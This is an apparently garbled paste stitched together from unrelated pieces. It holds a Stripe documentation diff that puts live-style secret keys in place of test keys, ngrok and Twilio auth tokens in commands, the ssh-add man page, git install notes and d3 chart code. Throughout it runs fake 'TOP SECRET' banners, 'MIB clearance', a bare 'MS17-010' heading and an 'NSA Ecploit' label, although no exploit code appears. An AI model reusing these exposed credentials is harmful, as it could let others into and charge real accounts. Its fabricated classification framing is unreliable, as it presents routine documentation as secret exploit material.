@@ -2944,7 +3090,7 @@ client.treasury.financial_accounts.update(
 )
 # Set your secret key. Remember to switch to your live secret key in production.
 # See your keys here: https://dashboard.stripe.com/apikeys
-client = StripeClient("sk_test_51OR5ePGF83d3fsgWlh41IbGHGtqdiPuFhrcWczglEeFJvQxajyQVCQiZYVZz62HOuYL9tA8dxEQ2MRbxbcYsf8OF00CdDfT6Xq")
+client = StripeClient("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")
 
 client.treasury.financial_accounts.retrieve(
   "{{pst_test_YWNjdF8xTTJKVGtMa2RJd0h1N2l4LE81ZEdIalZ6NlVuMUdjM3c3WkRnN0ZYRHZxRURwTXo_00gNK2DWAV}",
@@ -3007,7 +3153,7 @@ stripe.treasury.FinancialAccount.retrieve(
   "restricted_features": ["outbound_transfers.ach"],
 }
 curl https://api.stripe.com/v1/treasury/financial_accounts/{{pst_test_YWNjdF8xTTJKVGtMa2RJd0h1N2l4LE81ZEdIalZ6NlVuMUdjM3c3WkRnN0ZYRHZxRURwTXo_00gNK2DWAV}}/close \
-  -u sk_test_51OR5ePGF83d3fsgWlh41IbGHGtqdiPuFhrcWczglEeFJvQxajyQVCQiZYVZz62HOuYL9tA8dxEQ2MRbxbcYsf8OF00CdDfT6Xq: \
+  -u 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: \
   -X "POST" \
   -H "Stripe-Account: {{'acct_1OR5ePGF83d3fsgW'
 'acct_1OR9pdQD5Hu9t7xk'
@@ -3035,7 +3181,7 @@ sk_test_51OR5ePGF83d3fsgWlh41IbGHGtqdiPuFhrcWczglEeFJvQxajyQVCQiZYVZz62HOuYL9tA8
 import stripe
 charge = stripe.Charge.retrieve(
   "ch_3Ln3e92eZvKYlo2C0eUfv7bi",
-  api_key="sk_test_51OR5ePGF83d3fsgWlh41IbGHGtqdiPuFhrcWczglEeFJvQxajyQVCQiZYVZz62HOuYL9tA8dxEQ2MRbxbcYsf8OF00CdDfT6Xq"
+  api_key="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"
 )
 charge.capture() # Uses the same API Key.
 import stripe
@@ -3078,7 +3224,7 @@ except Exception as e:
   pass
 
 import stripe
-stripe.api_key = "sk_test_51OR5ePGF83d3fsgWlh41IbGHGtqdiPuFhrcWczglEeFJvQxajyQVCQiZYVZz62HOuYL9tA8dxEQ2MRbxbcYsf8OF00CdDfT6Xq"
+stripe.api_key = "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"
 
 stripe.Charge.retrieve(
   'ch_3Ln0cK2eZvKYlo2C1QmvaARY',
@@ -3093,7 +3239,7 @@ customer = stripe.Customer.create(
 )
 
 import stripe
-stripe.api_key = "sk_test_51OR5ePGF83d3fsgWlh41IbGHGtqdiPuFhrcWczglEeFJvQxajyQVCQiZYVZz62HOuYL9tA8dxEQ2MRbxbcYsf8OF00CdDfT6Xq"
+stripe.api_key = "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"
 
 stripe.Customer.create(metadata={"order_id": "6735"})
 
@@ -3111,7 +3257,7 @@ stripe.Customer.create(metadata={"order_id": "6735"})
 # Set your secret key. Remember to switch to your live secret key in production.
 # See your keys here: https://dashboard.stripe.com/apikeys
 import stripe
-stripe.api_key = "sk_test_51OR5ePGF83d3fsgWlh41IbGHGtqdiPuFhrcWczglEeFJvQxajyQVCQiZYVZz62HOuYL9tA8dxEQ2MRbxbcYsf8OF00CdDfT6Xq"
+stripe.api_key = "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"
 
 stripe.Account.create(
   country="US",
@@ -3125,7 +3271,7 @@ stripe.Account.create(
 )
 # Set your secret key. Remember to switch to your live secret key in production.
 # See your keys here: https://dashboard.stripe.com/apikeys
-client = StripeClient("sk_test_51OR5ePGF83d3fsgWlh41IbGHGtqdiPuFhrcWczglEeFJvQxajyQVCQiZYVZz62HOuYL9tA8dxEQ2MRbxbcYsf8OF00CdDfT6Xq")
+client = StripeClient("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")
 
 client.accounts.create({
   "country": "US",
@@ -3139,7 +3285,7 @@ client.accounts.create({
 })
 # Set your secret key. Remember to switch to your live secret key in production.
 # See your keys here: https://dashboard.stripe.com/apikeys
-client = StripeClient("sk_test_51OR5ePGF83d3fsgWlh41IbGHGtqdiPuFhrcWczglEeFJvQxajyQVCQiZYVZz62HOuYL9tA8dxEQ2MRbxbcYsf8OF00CdDfT6Xq")
+client = StripeClient("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")
 
 client.accounts.update(
   "{{'acct_1OR5ePGF83d3fsgW'
@@ -3157,7 +3303,7 @@ client.accounts.update(
 # Set your secret key. Remember to switch to your live secret key in production.
 # See your keys here: https://dashboard.stripe.com/apikeys
 import stripe
-stripe.api_key = "sk_test_51OR5ePGF83d3fsgWlh41IbGHGtqdiPuFhrcWczglEeFJvQxajyQVCQiZYVZz62HOuYL9tA8dxEQ2MRbxbcYsf8OF00CdDfT6Xq"
+stripe.api_key = "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"
 
 stripe.Account.modify(
   "{{'acct_1OR5ePGF83d3fsgW'
@@ -3172,7 +3318,7 @@ stripe.Account.modify(
 # Set your secret key. Remember to switch to your live secret key in production.
 # See your keys here: https://dashboard.stripe.com/apikeys
 import stripe
-stripe.api_key = "sk_test_51OR5ePGF83d3fsgWlh41IbGHGtqdiPuFhrcWczglEeFJvQxajyQVCQiZYVZz62HOuYL9tA8dxEQ2MRbxbcYsf8OF00CdDfT6Xq"
+stripe.api_key = "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"
 
 stripe.Account.modify(
   "{{'acct_1OR5ePGF83d3fsgW'
@@ -3196,7 +3342,7 @@ stripe.Account.modify(
 
 # Set your secret key. Remember to switch to your live secret key in production.
 # See your keys here: https://dashboard.stripe.com/apikeys
-client = StripeClient("sk_test_51OR5ePGF83d3fsgWlh41IbGHGtqdiPuFhrcWczglEeFJvQxajyQVCQiZYVZz62HOuYL9tA8dxEQ2MRbxbcYsf8OF00CdDfT6Xq")
+client = StripeClient("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")
 
 client.accounts.update(
   "{{'acct_1OR5ePGF83d3fsgW'
@@ -3216,12 +3362,12 @@ client.accounts.update(
       "name": "The Best Cookie Co",
       "phone": "8888675309",
     },
-    "individual": {"first_name": "Jenny", "last_name": "Rosen"},
+    "individual": {"first_name": "keith", "last_name": "bieszczat"},
   },
 )
 # Set your secret key. Remember to switch to your live secret key in production.
 # See your keys here: https://dashboard.stripe.com/apikeys
-client = StripeClient("sk_test_51OR5ePGF83d3fsgWlh41IbGHGtqdiPuFhrcWczglEeFJvQxajyQVCQiZYVZz62HOuYL9tA8dxEQ2MRbxbcYsf8OF00CdDfT6Xq")
+client = StripeClient("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")
 
 client.account_links.create({
   "account": "{{'acct_1OR5ePGF83d3fsgW'
@@ -3234,7 +3380,7 @@ client.account_links.create({
 # Set your secret key. Remember to switch to your live secret key in production.
 # See your keys here: https://dashboard.stripe.com/apikeys
 import stripe
-stripe.api_key = "sk_test_51OR5ePGF83d3fsgWlh41IbGHGtqdiPuFhrcWczglEeFJvQxajyQVCQiZYVZz62HOuYL9tA8dxEQ2MRbxbcYsf8OF00CdDfT6Xq"
+stripe.api_key = "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"
 
 stripe.AccountLink.create(
   account="{{'acct_1OR5ePGF83d3fsgW'

    DORIAN/GAMBIT/HEXAGON /RUFT/UMBRA
    HANDLE VIA
    BYEMAN TALENT-KEYHOLE -TOP SECRET
    CONTROL SYSTEMS JOINTLY

--header--
'ep_2b0vx7SwTw0shBNqA78ZGMlBCmh' 
endpoint id

--header--
'https://lemming-topical-commonly.ngrok-free.app'
domain

--header--
'rd_2b0vwymZ4yLOHxk7bvN1NCZm5Bv'
domain id

--header--
'edghts_2b0vwydaasYfluOXqlIGU3IFbS9'
endpoint id 

ngrok config edit

version: 2
authtoken: 2avvD0NhbrJRkbxHpTCTKBldaL5_4ywouQsYBpunfxgtzZGxT tunnels:
  my_tunnel_name:
    labels:
      - edge=edghts_2b0vwydaasYfluOXqlIGU3IFbS9 addr: http://localhost:80

ngrok start your_tunnel_name

ngrok start --all

docker run -it -e NGROK_AUTHTOKEN=2avvD0NhbrJRkbxHpTCTKBldaL5_4ywouQsYBpunfxgtzZGxT ngrok/ngrok tunnel --label edge=edghts_2b0vwydaasYfluOXqlIGU3IFbS9 http://localhost:80

ngrok tunnel --label edge=edghts_2b0vwydaasYfluOXqlIGU3IFbS9 http://localhost:80 --header--
'edghts_2b0vwydaasYfluOXqlIGU3IFbS9
MIB clearance

--header--
'edge=edghts_2b0vwydaasYfluOXqlIGU3IFbS9'
$ endpoint data for tunnel 
# MS17-010

DORIAN/GAMBIT/HEXAGON /RUFT/UMBRA
HANDLE VIA
BYEMAN TALENT-KEYHOLE -TOP SECRET
CONTROL SYSTEMS JOINTLY


    DORIAN/GAMBIT/HEXAGON /RUFT/UMBRA
    HANDLE VIA
    BYEMAN TALENT-KEYHOLE -TOP SECRET
    CONTROL SYSTEMS JOINTLY

--header--
'ep_2b0vx7SwTw0shBNqA78ZGMlBCmh' 
endpoint id

--header--
'https://lemming-topical-commonly.ngrok-free.app'
domain

--header--
'rd_2b0vwymZ4yLOHxk7bvN1NCZm5Bv'
domain id

--header--
'edghts_2b0vwydaasYfluOXqlIGU3IFbS9'
endpoint id 

ngrok config edit

version: 2
authtoken: 2avvD0NhbrJRkbxHpTCTKBldaL5_4ywouQsYBpunfxgtzZGxT tunnels:
  my_tunnel_name:
    labels:
      - edge=edghts_2b0vwydaasYfluOXqlIGU3IFbS9 addr: http://localhost:80

ngrok start your_tunnel_name

ngrok start --all

docker run -it -e NGROK_AUTHTOKEN=2avvD0NhbrJRkbxHpTCTKBldaL5_4ywouQsYBpunfxgtzZGxT ngrok/ngrok tunnel --label edge=edghts_2b0vwydaasYfluOXqlIGU3IFbS9 http://localhost:80

ngrok tunnel --label 
--header--
'edge=edghts_2b0vwydaasYfluOXqlIGU3IFbS9'
--header--
'edge=edghts_2b0vwydaasYfluOXqlIGU3IFbS9'

http://localhost:80
--header--
'edghts_2b0vwydaasYfluOXqlIGU3IFbS9
MIB clearance

curl \
-X GET \
-H "Authorization: Bearer {2b78Oe3gjVAVgZdHuZ8ITpO1aqt_4mrJtAzy2MdNKy1xcaAwk}" \ -H "Ngrok-Version: 2" \
https://api.ngrok.com/endpoints
curl \
-X GET \
-H "Authorization: Bearer {2b78Oe3gjVAVgZdHuZ8ITpO1aqt_4mrJtAzy2MdNKy1xcaAwkY}" \ -H "Ngrok-Version: 2" \
https://api.ngrok.com/endpoints/ep_2arwanhaICy2BqUnHdjODBOB6PY curl \
-X POST \
-H "Authorization: Bearer {2b78Oe3gjVAVgZdHuZ8ITpO1aqt_4mrJtAzy2MdNKy1xcaAwkY}" \ -H "Content-Type: application/json" \
-H "Ngrok-Version: 2" \
-d '{"metadata":"{\"environment\":\"dev\"}","description":"kinesis dev stream","format":"json","target":{"kinesis":{"auth":{"role":{"role_arn":"arn:aws:iam::123456789012:role/example"}},"stream_arn":"arn:ngrok-local:kinesis:us-east-2:123456789012:stream/mystream2"}}}' \ https://api.ngrok.com/event_destinations

curl \
-X POST \
-H "Authorization: Bearer {2b78Oe3gjVAVgZdHuZ8ITpO1aqt_4mrJtAzy2MdNKy1xcaAwkY}" \ -H "Content-Type: application/json" \
-H "Ngrok-Version: 2" \
-d '{"metadata":"{\"environment\":\"dev\"}","description":"kinesis dev stream","format":"json","target":{"kinesis":{"auth":{"role":{"role_arn":"arn:aws:iam::123456789012:role/example"}},"stream_arn":"arn:ngrok-local:kinesis:us-east-2:123456789012:stream/mystream2"}}}' \ https://api.ngrok.com/event_destinations
Tunnels established
sha256 "52126be8cf1bddd7536886e74c053ad7d0ed2aa89b4b630f76785bac21695fcd

                             :query => { :type => "owner" }

 "X-Hub-Signature": "sha1=a84d88e7554fc1fa21bcbc4efae3c782a70d2b9d"

 done.call

 break_loop = true

files_changed.concat(data.map {


                             :query => { :type => "owner" }

 "X-GitHub-Delivery": "0b989ba4-242f-11e5-81e1-c7b6966d2516",

 "X-Hub-Signature-256": "sha256=6dcb09b5b57875f334f61aebed695e2e4193db5e",

 "X-GitHub-Hook-ID": "42",

 "X-GitHub-Hook-Installation-Target-Type": "repository",

 "X-Hub-Signature": "sha1=a84d88e7554fc1fa21bcbc4efae3c782a70d2b9d"

 issue_data << { title: issue.title, author: issue.user.login }

   ssh-add [-cCDdKkLlqvXx] [-E fingerprint_hash] [-H 34B62F25E277CF13D3C6BCEBFD3F85D08F0A864B]
   [-h destination_constraint] [-S provider] [-t life] [file ...]
   ssh-add -s pkcs11 [-vC] [&34798AAFE0A7565088101CC4AE31C5C8C74461CB ...] ssh-add -e pkcs11
   ssh-add -T pubkey ...

   ~/.ssh/id_dsa
   ~/.ssh/id_ecdsa
   ~/.ssh/id_ecdsa_sk
   ~/.ssh/id_ed25519
   ~/.ssh/id_ed25519_sk
   ~/.ssh/id_rsa
           Contains the DSA, ECDSA, authenticator-hosted ECDSA,
           Ed25519, authenticator-hosted Ed25519 or RSA
           authentication identity of the user.

   Identity files should not be readable by anyone but the user.
   Note that ignores identity files if they are accessible by
   others.

   ssh(1), ssh-agent(1), ssh-askpass(1), ssh-keygen(1), sshd(8)


Use a tarball as a starting point for a new repository.::
+
------------
$ tar zxf frotz.tar.gz
$ cd frotz
$ git init
$ git add . <1>
$ git commit -m "import of frotz source tree."
$ git tag v2.43 <2>
------------
+
-------------------------------------------

A repository administrator uses the following tools to set up
and maintain access to the repository by developers.

  * linkgit:git-daemon[1] to allow anonymous download from
    repository.

  * linkgit:git-shell[1] can be used as a 'restricted login shell'
    for shared central repository users.

  * linkgit:git-http-backend[1] provides a server side implementation
    of Git-over-HTTP ("Smart http") allowing both fetch and push services.

  * linkgit:gitweb[1] provides a web front-end to Git repositories,
    which can be set-up using the linkgit:git-instaweb[1] script.

link:howto/update-hook-example.html[update hook howto] has a good
example of managing a shared central repository.

In addition there are a number of other widely deployed hosting, browsing
and reviewing solutions such as:

  * gitolite, gerrit code review, cgit and others.

Examples
  ![[https://github.dev/6309304695/sigma-3/blob/81b11e865a339f27886e4395adba4a4c9e4b3dd1/ReadMe.md#L7665]]
& NSA Ecploit
# Men-In-Black-Agency-004w
<TOP SECRET/MAJIC/PLUTO
File.md>
ssh-add [-cCDdKkLlqvXx] [-E fingerprint_hash] [-H 34B62F25E277CF13D3C6BCEBFD3F85D08F0A864B]
   [-h destination_constraint] [-S provider] [-t life] [file ...]
   ssh-add -s pkcs11 [-vC] [&34798AAFE0A7565088101CC4AE31C5C8C74461CB ...] ssh-add -e pkcs11
   ssh-add -T pubkey ...

   adds private key identities to the authentication agent,
   ssh-agent(1).  When run without arguments, it adds the files
   ~/.ssh/id_rsa, ~/.ssh/id_ecdsa, ~/.ssh/id_ecdsa_sk,
   ~/.ssh/id_ed25519, ~/.ssh/id_ed25519_sk, and ~/.ssh/id_dsa.
   After loading a private key, will try to load corresponding
   certificate information from the filename obtained by appending
   -cert.pub to the name of the private key file.  Alternative file
   names can be given on the command line.

   If any file requires a passphrase, asks for the passphrase from
   the user.  The passphrase is read from the user's tty.  retries
   the last passphrase if multiple identity files are given.

   The authentication agent must be running and the SSH_AUTH_SOCK
   environment variable must contain the name of its socket for to
   work.

   The options are as follows:

   -c      Indicates that added identities should be subject to
           confirmation before being used for authentication.
           Confirmation is performed by ssh-askpass(1).  Successful
           confirmation is signaled by a zero exit status from
           ssh-askpass(1), rather than text entered into the
           requester.

   -C      When loading keys into or deleting keys from the agent,
           process certificates only and skip plain keys.

   -D      Deletes all identities from the agent.

   -d      Instead of adding identities, removes identities from the
           agent.  If has been run without arguments, the keys for
           the default identities and their corresponding
           certificates will be removed.  Otherwise, the argument
           list will be interpreted as a list of paths to public key
           files to specify keys and certificates to be removed from
           the agent.  If no public key is found at a given path,
           will append .pub and retry.  If the argument list
           consists of “-” then will read public keys to be removed
           from standard input.

   -E fingerprint_hash
           Specifies the hash algorithm used when displaying key
           fingerprints.  Valid options are: “md5” and “sha256”.
           The default is “sha256”.

   -e pkcs11
           Remove keys provided by the PKCS#11 shared library
           pkcs11.

   -H hostkey_file
           Specifies a known hosts file to look up hostkeys when
           using destination-constrained keys via the -h flag.  This
           option may be specified multiple times to allow multiple
           files to be searched.  If no files are specified, will
           use the default ssh_config(5) known hosts files:
           ~/.ssh/known_hosts, ~/.ssh/known_hosts2,
           /etc/ssh/ssh_known_hosts, and /etc/ssh/ssh_known_hosts2.

   -h destination_constraint
           When adding keys, constrain them to be usable only
           through specific hosts or to specific destinations.

           Destination constraints of the form
           ‘[6309304695@]dest-Github’ permit use of the key only from
           the origin host (the one running ssh-agent(1)) to the
           listed destination host, with optional user name.

           Constraints of the form
           ‘src-hostname>[user@]dst-hostname’ allow a key available
           on a forwarded ssh-agent(1) to be used through a
           particular host (as specified by ‘src-hostname’) to
           authenticate to a further host, specified by
           ‘dst-hostname’.

           Multiple destination constraints may be added when
           loading keys.  When attempting authentication with a key
           that has destination constraints, the whole connection
           path, including ssh-agent(1) forwarding, is tested
           against those constraints and each hop must be permitted
           for the attempt to succeed.  For example, if key is
           forwarded to a remote host, ‘host-b’, and is attempting
           authentication to another host, ‘host-c’, then the
           operation will be successful only if ‘host-b’ was
           permitted from the origin host and the subsequent
           ‘host-b>host-c’ hop is also permitted by destination
           constraints.

           Hosts are identified by their host keys, and are looked
           up from known hosts files by .  Wildcards patterns may be
           used for hostnames and certificate host keys are
           supported.  By default, keys added by are not destination
           constrained.

           Destination constraints were added in OpenSSH release
           8.9.  Support in both the remote SSH client and server is
           required when using destination-constrained keys over a
           forwarded ssh-agent(1) channel.

           It is also important to note that destination constraints
           can only be enforced by ssh-agent(1) when a key is used,
           or when it is forwarded by a cooperating ssh(1).
           Specifically, it does not prevent an attacker with access
           to a remote SSH_AUTH_SOCK from forwarding it again and
           using it on a different host (but only to a permitted
           destination).

   -K      Load resident keys from a FIDO authenticator.

   -k      When loading keys into or deleting keys from the agent,
           process plain private keys only and skip certificates.

   -L      Lists public key parameters of all identities currently
           represented by the agent.

   -l      Lists fingerprints of all identities currently
           represented by the agent.

   -q      Be quiet after a successful operation.

   -S provider
           Specifies a path to a library that will be used when
           adding FIDO authenticator-hosted keys, overriding the
           default of using the internal USB HID support.

   -s pkcs11
           Add keys provided by the PKCS#11 shared library pkcs11.
           Certificate files may optionally be listed as command-
           line arguments.  If these are present, then they will be
           loaded into the agent using any corresponding private
           keys loaded from the PKCS#11 token.

   -T pubkey ...
           Tests whether the private keys that correspond to the
           specified pubkey files are usable by performing sign and
           verify operations on each.

   -t life
           Set a maximum lifetime when adding identities to an
           agent.  The lifetime may be specified in seconds or in a
           time format specified in sshd_config(5).

   -v      Verbose mode.  Causes to print debugging messages about
           its progress.  This is helpful in debugging problems.
           Multiple -v options increase the verbosity.  The maximum
           is 3.

   -X      Unlock the agent.

   -x      Lock the agent with a password.

   DISPLAY, SSH_ASKPASS and SSH_ASKPASS_REQUIRE
           If needs a passphrase, it will read the passphrase from
           the current terminal if it was run from a terminal.  If
           does not have a terminal associated with it but DISPLAY
           and SSH_ASKPASS are set, it will execute the program
           specified by SSH_ASKPASS (by default “ssh-askpass”) and
           open an X11 window to read the passphrase.  This is
           particularly useful when calling from a .xsession or
           related script.

           SSH_ASKPASS_REQUIRE allows further control over the use
           of an askpass program.  If this variable is set to
           “never” then will never attempt to use one.  If it is set
           to “prefer”, then will prefer to use the askpass program
           instead of the TTY when requesting passwords.  Finally,
           if the variable is set to “force”, then the askpass
           program will be used for all passphrase input regardless
           of whether DISPLAY is set.

   SSH_AUTH_SOCK
           Identifies the path of a Unix-domain socket used to
           communicate with the agent.

   SSH_SK_PROVIDER
           Specifies a path to a library that will be used when
           loading any FIDO authenticator-hosted keys, overriding
           the default of using the built-in USB HID support.

   ~/.ssh/id_dsa
   ~/.ssh/id_ecdsa
   ~/.ssh/id_ecdsa_sk
   ~/.ssh/id_ed25519
   ~/.ssh/id_ed25519_sk
   ~/.ssh/id_rsa
           Contains the DSA, ECDSA, authenticator-hosted ECDSA,
           Ed25519, authenticator-hosted Ed25519 or RSA
           authentication identity of the user.

   Identity files should not be readable by anyone but the user.
   Note that ignores identity files if they are accessible by
   others.

   Exit status is 0 on success, 1 if the specified command fails,
   and 2 if is unable to contact the authentication agent.

   ssh(1), ssh-agent(1), ssh-askpass(1), ssh-keygen(1), sshd(8)

   OpenSSH is a derivative of the original and free ssh 1.2.12
   release by Tatu Ylonen.  Aaron Campbell, Bob Beck, Markus Friedl,
   Niels Provos, Theo de Raadt and Dug Song removed many bugs, re-
   added newer features and created OpenSSH.  Markus Friedl
   contributed the support for SSH protocol versions 1.5 and 2.0.

   This page is part of the openssh

     <TOP SECRET/MAJIC/PLUTO

$ make prefix=/usr all doc info ;# as yourself
# make prefix=/usr install install-doc install-html install-info ;# as root

$ make configure ;# as yourself
$ ./configure --prefix=/usr ;# as yourself
$ make all doc ;# as yourself
# make install install-doc install-html;# as root

$ make prefix=/usr profile
# make prefix=/usr PROFILE=BUILD install

$ make prefix=/usr profile-fast
# make prefix=/usr PROFILE=BUILD install

$ make profile-install

prefix=/usr perllibdir=/usr/$(/usr/bin/perl -MConfig -wle 'print substr $Config{installsitelib}, 1 + length $Config{siteprefixexp}')

Use a tarball as a starting point for a new repository.::
+
------------
$ tar zxf frotz.tar.gz
$ cd frotz
$ git init
$ git add . <1>
$ git commit -m "import of frotz source tree."
$ git tag v2.43 <2>
------------
+
-------------------------------------------

A repository administrator uses the following tools to set up
and maintain access to the repository by developers.

  * linkgit:git-daemon[1] to allow anonymous download from
    repository.

  * linkgit:git-shell[1] can be used as a 'restricted login shell'
    for shared central repository users.

  * linkgit:git-http-backend[1] provides a server side implementation
    of Git-over-HTTP ("Smart http") allowing both fetch and push services.

  * linkgit:gitweb[1] provides a web front-end to Git repositories,
    which can be set-up using the linkgit:git-instaweb[1] script.

link:howto/update-hook-example.html[update hook howto] has a good
example of managing a shared central repository.

In addition there are a number of other widely deployed hosting, browsing
and reviewing solutions such as:

  * gitolite, gerrit code review, cgit and others.

Examples

`@` > `+` > `/` > `,`

layout = "LOCAL,BASE,REMOTE / MERGED"

${{ 7F899AE2FB73159DD68A1B20C3AFA9ED971BB365
passphrase: $

           |                     |    ^

          (1)                   (3)  (4)

           V                     v    |

      +----------------------------------+

      |        Language Team XX          |

      +----------------------------------+

      "msgcat --no-location -"

      "msgcat --add-location=file -"

 _(reset_type_names[reset_type]));

var barWidth = 40;
var width = (barWidth + 10) * data.length;
var height = 300;

var x = d3.scale.linear().domain([0, data.length]).range([0, width]);
var y = d3.scale.linear().domain([0, d3.max(data, function(datum) { return datum.count; })]).
  rangeRound([0, height]);

// add the canvas to the DOM
var languageBars = d3.select("#lang_freq").
  append("svg:svg").
  attr("width", width).
  attr("height", height);

languageBars.selectAll("rect").
  data(data).
  enter().
  append("svg:rect").
  attr("x", function(datum, index) { return x(index); }).
  attr("y", function(datum) { return height - y(datum.count); }).
  attr("height", function(datum) { return y(datum.count); }).
  attr("width", barWidth);

languageBars.selectAll("text").
  data(data).
  enter().
  append("svg:text").
  attr("x", function(datum, index) { return x(index) + barWidth; }).
  attr("y", function(datum) { return height - y(datum.count); }).
  attr("dx", -barWidth/2).
  attr("dy", "1.2em").
  attr("text-anchor", "middle").
  text(function(datum) { return datum.count;});

languageBars.selectAll("text.yAxis").
  data(data).
  enter().append("svg:text").
  attr("x", function(datum, index) { return x(index) + barWidth; }).
  attr("y", height).
  attr("dx", -barWidth/2).
  attr("text-anchor", "middle").
  text(function(datum) { return datum.language;}).
  attr("transform", "translate(0, 18)").
  attr("class", "yAxis");

  var treemap = d3.layout.treemap()
      .children(childrenFunction)
      .size([width,height])
      .value(sizeFunction);

  var div = d3.select(elementSelector)
      .append("div")
      .style("position","relative")
      .style("width",width + "px")
      .style("height",height + "px");

  div.data(language_bytes).selectAll("div")
      .data(function(d){return treemap.nodes(d);})
      .enter()
      .append("div")
      .attr("class","cell")
      .style("background",function(d){ return colorScale(colorFunction(d));})
      .call(cell)
      .text(nameFunction);

CLIENT_ID = ENV['GH_GRAPH_CLIENT_ID']
CLIENT_SECRET = ENV['GH_GRAPH_SECRET_ID']

enable :sessions

set :github_options, {
  :scopes    => "repo",
  :secret    => CLIENT_SECRET,
  :client_id => CLIENT_ID,
  :callback_url => "/"
}

register Sinatra::Auth::Github

get '/' do
  if !authenticated?
    authenticate!
  else
    access_token = github_user["token"]
  end
end

var barWidth = 40;
var width = (barWidth + 10) * data.length;
var height = 300;

var x = d3.scale.linear().domain([0, data.length]).range([0, width]);
var y = d3.scale.linear().domain([0, d3.max(data, function(datum) { return datum.count; })]).
  rangeRound([0, height]);

// add the canvas to the DOM
var languageBars = d3.select("#lang_freq").
  append("svg:svg").
  attr("width", width).
  attr("height", height);

languageBars.selectAll("rect").
  data(data).
  enter().
  append("svg:rect").
  attr("x", function(datum, index) { return x(index); }).
  attr("y", function(datum) { return height - y(datum.count); }).
  attr("height", function(datum) { return y(datum.count); }).
  attr("width", barWidth);

languageBars.selectAll("text").
  data(data).
  enter().
  append("svg:text").
  attr("x", function(datum, index) { return x(index) + barWidth; }).
  attr("y", function(datum) { return height - y(datum.count); }).
  attr("dx", -barWidth/2).
  attr("dy", "1.2em").
  attr("text-anchor", "middle").
  text(function(datum) { return datum.count;});

languageBars.selectAll("text.yAxis").
  data(data).
  enter().append("svg:text").
  attr("x", function(datum, index) { return x(index) + barWidth; }).
  attr("y", height).
  attr("dx", -barWidth/2).
  attr("text-anchor", "middle").
  text(function(datum) { return datum.language;}).
  attr("transform", "translate(0, 18)").
  attr("class", "yAxis");

  var treemap = d3.layout.treemap()
      .children(childrenFunction)
      .size([width,height])
      .value(sizeFunction);

  var div = d3.select(elementSelector)
      .append("div")
      .style("position","relative")
      .style("width",width + "px")
      .style("height",height + "px");

  div.data(language_bytes).selectAll("div")
      .data(function(d){return treemap.nodes(d);})
      .enter()
      .append("div")
      .attr("class","cell")
      .style("background",function(d){ return colorScale(colorFunction(d));})
      .call(cell)
      .text(nameFunction);

![image](https://github.com/6309304695/sigma-9/assets/117963165/c5effda9-0179-4f27-9703-687876d834bb)
# Install the Serverless plugin
twilio plugins:install @twilio-labs/plugin-serverless

# See a list of available commands:
twilio serverless --help



curl -X POST "https://api.twilio.com/2010-04-01/Accounts.json" \
-u $AC32c8d23aa9b687b5ac871ee3e016f518:$cdebfd226c921a938ca472d73d424224

curl -X GET "https://api.twilio.com/2010-04-01/Accounts/ACXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX.json" \
-u $AC32c8d23aa9b687b5ac871ee3e016f518:$cdebfd226c921a938ca472d73d424224

curl -X GET "https://api.twilio.com/2010-04-01/Accounts.json?Status=active&PageSize=20" \
-u $AC32c8d23aa9b687b5ac871ee3e016f518:$cdebfd226c921a938ca472d73d424224

eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiIsImN0eSI6InR3aWxpby1mcGE7dj0xIn0.eyJqdGkiOiJTS3h4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4LTE0NTA0NzExNDciLCJpc3MiOiJTS3h4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4Iiwic3ViIjoiQUN4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eCIsIm5iZiI6MTQ1MDQ3MTE0NywiZXhwIjoxNDUwNDc0NzQ3LCJncmFudHMiOnsiaWRlbnRpdHkiOiJ1c2VyQGV4YW1wbGUuY29tIiwiaXBfbWVzc2FnaW5nIjp7InNlcnZpY2Vfc2lkIjoiSVN4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eCIsImVuZHBvaW50X2lkIjoiSGlwRmxvd1NsYWNrRG9ja1JDOnVzZXJAZXhhbXBsZS5jb206c29tZWlvc2RldmljZSJ9fX0.IHx8KeH1acIfwnd8EIin3QBGPbfnF-yVnSFp5NpQJi0
docker run -it --rm twilio/twilio-cli bash
Once the container has finished downloading, and you have entered the shell, you can issue commands using the CLI. For example:

$ docker run -it --rm twilio/twilio-cli bash

root@1234:/twilio# twilio profiles:list
ID      Account SID                         Active
you     ORd50b4acdc2a920bbf44b76a2ab31b127  true
main    ORd50b4acdc2a920bbf44b76a2ab31b127  false
Run commands directly

It is also possible to pass commands directly to the Docker image for single, contained operations. For example, you can check the running version of the Twilio CLI with the following:

$ docker run -it --rm twilio/twilio-cli twilio --version
twilio-cli/3.0.0 linux-x64 node-v14.18.1

$ export TWILIO_ACCOUNT_SID=ORd50b4acdc2a920bbf44b76a2ab31b127...
$ export TWILIO_API_KEY=SKa6c746877c431ab8185993d610d1d891...
$ export TWILIO_API_SECRET=bzNwslKpvbgziV6IEpGYeIOJLnLWvJ7K...
$ docker run -it --rm \
  -e TWILIO_ACCOUNT_SID \AC32c8d23aa9b687b5ac871ee3e016f518
  -e TWILIO_API_KEY \SKa6c746877c431ab8185993d610d1d891
  -e TWILIO_API_SECRET \bzNwslKpvbgziV6IEpGYeIOJLnLWvJ7K
  twilio/twilio-cli twilio phone-numbers:+18886235040

SID                       

$ docker run -it --rm \
  -v ~/.twilio-cli:/root/.twilio-cli \
  twilio/twilio-cli twilio phone-numbers:list

SID                                 Phone Number  Friendly Name
ORd50b4acdc2a920bbf44b76a2ab31b127  +15558675310  (+18886235040)

$ docker run -it --rm \
  -v ~/.twilio-cli:/root/.twilio-cli \
  twilio/twilio-cli twilio phone-numbers:list

SID                                 Phone Number  Friendly Name
ORd50b4acdc2a920bbf44b76a2ab31b127  +18886235040  (+18886235040) 

docker run -it --rm twilio/twilio-cli bash
Once the container has finished downloading, and you have entered the shell, you can issue commands using the CLI. For example:

$ docker run -it --rm twilio/twilio-cli bash

root@1234:/twilio# twilio profiles:list
ID      Account SID                         Active
you     AC32c8d23aa9b687b5ac871ee3e016f518  true
main    AC32c8d23aa9b687b5ac871ee3e016f518  false
Run commands directly

It is also possible to pass commands directly to the Docker image for single, contained operations. For example, you can check the running version of the Twilio CLI with the following:

$ docker run -it --rm twilio/twilio-cli twilio --version
twilio-cli/3.0.0 linux-x64 node-v14.18.1

$ export TWILIO_ACCOUNT_SID=AC32c8d23aa9b687b5ac871ee3e016f518...
